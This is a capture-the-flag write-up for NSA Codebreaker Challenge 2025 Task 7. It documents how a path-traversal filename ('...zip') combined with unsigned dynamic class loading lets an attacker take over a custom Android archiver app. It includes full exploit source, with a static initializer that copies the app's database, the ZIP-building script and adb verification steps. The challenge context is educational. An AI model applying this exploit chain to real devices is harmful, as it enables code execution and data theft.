# NSA Codebreaker Challenge 2025 – Task 7: Finale

**Competition:** NSA Codebreaker Challenge 2025  
**Category:** Vulnerability Research, Exploitation   

---

## Challenge Description

Now that we have access to the hidden channel the adversary is using, our military counterparts want to act quickly to destroy the adversary's capacity to continue with their attack against our military networks.

Analysts have been quickly scrutinizing the data from the privileged channel. They conclude that the adversary has downloaded a custom app to archive all messages sent in the channel locally to their phone. They have also surmised the adversary is running a recent version of Android on a Google Pixel phone. This is the opportunity we have been waiting for! If we can devise a way to exploit on to the adversary's device we will have the advantage.

Another team has retrieved the custom application APK file for you to analyze.

**Prompt:** Submit a file to be posted to the Mattermost Channel that will be processed by the app and exploits the device. Be careful, we might only be able to do this once!

**Provided Materials:**
- `mmarchiver.apk` – Custom Android application
- `licenses.txt` - Licenses
---

## Methodology

### Phase 1: Vulnerability Analysis

**Vulnerability #1: Path Traversal**

Basename extraction function:
```java
public static String getBaseName(String filename) {
    String name = filename.substring(
        Math.max(filename.lastIndexOf('/'), filename.lastIndexOf('\\')) + 1
    );
    int lastDot = name.lastIndexOf('.');
    return lastDot == -1 ? name : name.substring(0, lastDot);
}
```

**Exploitation:**
- Filename: `...zip`
- Basename: `..`
- Extract path: `/cache/zippier/extract/..`
- Canonical path: `/cache/zippier/` (parent directory)

**Vulnerability #2: Insecure Dynamic Class Loading**

```java
File formatJar = new File("/cache/zippier/formats/net.axolotl.zippier.ZipFormat_" + extension + ".jar");
if (formatJar.exists()) {
    DexClassLoader loader = new DexClassLoader(formatJar.getAbsolutePath(), ...);
    Class<?> formatClass = loader.loadClass("net.axolotl.zippier.ZipFormat_" + extension);
    ZipFormat format = (ZipFormat) formatClass.newInstance();  // Static initializer executes here
}
```

**Issues:**
- No code signature verification
- Loads code from cache directory
- Static initializers execute arbitrary code

### Phase 2: Exploit Development

**Step 1: Create malicious format handler**

Created Android Studio project with package `net.axolotl.zippier`:

```
   - Package name: `net.axolotl.zippier`
   - Language: **Java**
   - Minimum SDK: API 21
```
Navigate to `app/kotlin+java/net.axolotl.zippier/` and create three files:

**ZipFormat.java** (Interface):
```java
package net.axolotl.zippier;

import java.io.File;

public interface ZipFormat {
    String getExtension();
    void uncompress(File inFile, File targetPath, ZipFile outFile);
}
```

**ZipFile.java** (Interface):
```java
package net.axolotl.zippier;

import java.io.File;
import java.io.FileNotFoundException;

public interface ZipFile {
    ZipFile addFile(File file) throws FileNotFoundException;
    void write();
}
```

**ZipFormat_xz.java** (Exploit):
```java
package net.axolotl.zippier;

import java.io.File;

public class ZipFormat_xz implements ZipFormat {
    
    static {
        // EXPLOIT CODE - Executes when class is loaded
        try {
            File dbPath = new File("/data/data/com.badguy.mmarchiver/databases/archive_database");
            File outputPath = new File("/sdcard/Download/exfiltrated.db");
            
            if (dbPath.exists()) {
                copyFile(dbPath, outputPath);
            }
            
            File proofFile = new File("/sdcard/Download/pwned.txt");
            writeFile(proofFile, "Successfully exploited!");
            
        } catch (Exception e) {
            // Silent fail
        }
    }
    
    private static void copyFile(File src, File dst) throws Exception {
        java.io.FileInputStream in = new java.io.FileInputStream(src);
        java.io.FileOutputStream out = new java.io.FileOutputStream(dst);
        byte[] buf = new byte[1024];
        int len;
        while ((len = in.read(buf)) > 0) {
            out.write(buf, 0, len);
        }
        in.close();
        out.close();
    }
    
    private static void writeFile(File file, String content) throws Exception {
        java.io.FileWriter writer = new java.io.FileWriter(file);
        writer.write(content);
        writer.close();
    }
    
    @Override
    public String getExtension() {
        return "xz";
    }
    
    @Override
    public void uncompress(File inFile, File targetPath, ZipFile outFile) {
        try {
            outFile.addFile(inFile);
        } catch (Exception e) {
            // Ignore
        }
    }
}
```

**Step 2: Build and extract DEX**

1. Build the project:
   - In Android Studio: **Build → Make Project** (or Ctrl+F9)
   - Wait for "BUILD SUCCESSFUL"

2. Find the DEX file:
   - Open Terminal in Android Studio (bottom panel)
   - Navigate and search:
```powershell
   cd app\build
   Get-ChildItem -Recurse -Filter "classes.dex" | Select-Object FullName
```

3. Identify correct DEX:
   - You'll see multiple DEX files in different directories
   - Check numbered subdirectories like `mergeProjectDexDebug\8\classes.dex`
   - Copy all candidates:
```powershell
   copy "app\build\intermediates\dex\debug\mergeProjectDexDebug\8\classes.dex" C:\Users\user\Desktop\classes_8.dex
   copy "app\build\intermediates\dex\debug\mergeProjectDexDebug\0\classes.dex" C:\Users\user\Desktop\classes_0.dex
```

4. Transfer to Kali and verify:
```bash
   # Check which contains your classes
   dexdump -f classes_8.dex | grep "Class descriptor" | grep -i "zipformat\|axolotl"
   dexdump -f classes_0.dex | grep "Class descriptor" | grep -i "zipformat\|axolotl"
   
   # Should show:
   # Class descriptor  : 'Lnet/axolotl/zippier/ZipFile;'
   # Class descriptor  : 'Lnet/axolotl/zippier/ZipFormat;'
   # Class descriptor  : 'Lnet/axolotl/zippier/ZipFormat_xz;'
```

5. Create Malicious JAR
```bash
cd ~/your-working-directory

# Use the correct DEX file (the one that contained your classes)
cp classes_8.dex classes.dex

# Package as JAR (JAR is just a ZIP file containing classes.dex)
zip net.axolotl.zippier.ZipFormat_xz.jar classes.dex

# Verify
unzip -l net.axolotl.zippier.ZipFormat_xz.jar
# Should show: classes.dex
```

**Step 3: Create exploit ZIP**

```python
#!/usr/bin/env python3
import zipfile

with zipfile.ZipFile('...zip', 'w') as zf:
    # Malicious format handler
    zf.write('net.axolotl.zippier.ZipFormat_xz.jar', 
             'formats/net.axolotl.zippier.ZipFormat_xz.jar')
    
    # Trigger file with .xz extension
    zf.writestr('payload.xz', b'\xFD7zXZ\x00')

print("Created exploit: ...zip")
```

### Phase 3: Exploitation

**Prepare application:**
```bash
# Clear app state (CRITICAL - app caches failures)
adb shell pm clear com.badguy.mmarchiver

# Restart and reconfigure app
adb shell am start -n com.badguy.mmarchiver/.MainActivity
```

**Upload exploit:**
- Via Mattermost web UI, upload `...zip` to configured channel
- Application automatically downloads and processes

**Verify success:**
```bash
# Check for exfiltrated files
adb shell ls -la /sdcard/Download/

# Pull database
adb pull /sdcard/Download/exfiltrated.db ./

# Pull proof file
adb pull /sdcard/Download/pwned.txt ./
```

---

## Exploitation Flow

```
1. App downloads ...zip from Mattermost
2. Extracts to /cache/zippier/extract/.. → /cache/zippier/
3. Contents extracted:
   - /cache/zippier/formats/net.axolotl.zippier.ZipFormat_xz.jar
   - /cache/zippier/payload.xz
4. App encounters payload.xz during processing
5. Loads format handler from /cache/zippier/formats/
6. DexClassLoader loads malicious JAR
7. Static initializer executes → Database exfiltrated
```

---

## Solution

**Exploit File:** `...zip` (exactly three dots)

**Contents:**
- `formats/net.axolotl.zippier.ZipFormat_xz.jar` – Malicious format handler
- `payload.xz` – Trigger file (XZ magic bytes)

**Result:**
- Code execution achieved
- Database exfiltrated to `/sdcard/Download/exfiltrated.db`
- Proof file created at `/sdcard/Download/pwned.txt`

---